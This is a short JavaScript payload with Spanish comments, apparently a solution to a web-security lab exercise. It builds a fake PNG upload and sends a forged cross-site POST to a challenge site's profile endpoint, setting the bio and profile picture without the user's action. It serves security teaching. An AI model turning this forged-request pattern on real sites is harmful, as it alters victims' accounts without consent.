// Esto es un PNG real de 1x1 píxel transparente
var base64Image = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=";

// Convertimos el base64 a bytes puros
var byteCharacters = atob(base64Image);
var byteNumbers = new Array(byteCharacters.length);
for (var i = 0; i < byteCharacters.length; i++) {
    byteNumbers[i] = byteCharacters.charCodeAt(i);
}
var byteArray = new Uint8Array(byteNumbers);

// Creamos el Blob válido
var fakeImage = new Blob([byteArray], { type: 'image/png' });

var formData = new FormData();
formData.append("bio", "None"); 
// Le ponemos el nombre que pide el enunciado
formData.append("profile_pic", fakeImage, "image_4a1768.png"); 

// Hacer el fetch POST aquí...
      fetch('https://chl-4678a9a0-9134-4d4a-9ff5-023cd20a4d1c-blog-hacklab.softwareseguro.com.ar/profile', {
        method: 'POST',
        body: formData
      });


// Recuerda poner la ruta correcta de la petición original aquí


